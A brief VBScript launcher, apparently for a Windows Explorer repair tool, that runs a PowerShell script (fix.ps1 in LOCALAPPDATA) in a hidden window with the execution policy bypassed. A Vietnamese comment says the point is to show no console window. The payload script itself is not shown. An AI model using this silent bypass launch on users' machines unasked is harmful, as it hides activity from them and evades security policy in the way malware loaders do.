Set WshShell = CreateObject("WScript.Shell")
target = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\AutoFixExplorer\fix.ps1")

' Tham so 0: Chay hoan toan an (Hidden Window), khong hien CMD/PowerShell
WshShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & target & """", 0, False
